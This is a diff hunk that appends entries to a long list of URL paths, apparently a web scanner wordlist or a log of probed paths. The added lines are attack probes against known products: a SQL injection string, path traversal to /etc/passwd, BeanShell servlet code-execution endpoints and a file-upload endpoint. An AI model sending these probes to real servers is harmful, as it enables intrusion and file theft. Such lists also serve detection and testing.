@@ -23753,3 +23753,15 @@ m.naver.com:443
 /public/file-manager/content
 /?srsltid=AfmBOooW33SniN10EXwDZbcDvZK8DPgYOnmwHfSsjuXvNjaib21YEZ2u
 /?srsltid=AfmBOorWNKe_rQY1X-Vvdob3T2T6aZZEILTB1_zyM_u-swqkb4J57hS-
+/bsh.servlet.BshServlet
+/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d
+/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId
+/cgi-bin/rpc
+/servlet/~ic/bsh.servlet.BshServlet
+/images/logo/logo-eoffice.php
+/zentao/user-login.html
+/seeyon/htmlofficeservlet
+/dataSetParam/verification;swagger-ui/
+/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd
+/export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd
+/uapjs/jsinvoke/?action=invoke
